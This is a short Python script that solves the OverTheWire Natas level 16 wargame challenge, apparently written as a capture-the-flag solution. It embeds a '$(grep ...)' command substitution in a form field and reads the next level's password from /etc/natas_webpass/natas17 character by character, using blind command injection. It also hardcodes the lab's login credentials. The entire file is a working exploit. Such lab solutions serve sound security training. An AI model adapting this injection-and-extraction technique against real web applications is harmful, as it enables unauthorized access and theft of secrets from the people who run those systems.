import string
import requests
from requests.auth import HTTPBasicAuth

DEBUG = True

AUTH = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
URL = 'http://natas16.natas.labs.overthewire.org/'

def fn(known):
	if len(known) == 32:
		return known

	for c in (string.ascii_letters + string.digits):
		attempt = '^' + known + c

		if DEBUG:
			print('*** Trying with {}'.format(attempt))

		payload = '$(grep -E ' + attempt + ' /etc/natas_webpass/natas17)africans'

		r = requests.post(URL, auth=AUTH, data={'needle': payload})
		if 'Africans' not in r.text:
			if DEBUG:
				print('*** Success!, found {}'.format(attempt))
			return fn(attempt[1:])

	if DEBUG:
		print('*** Nothing found. :(')

print(fn(''))
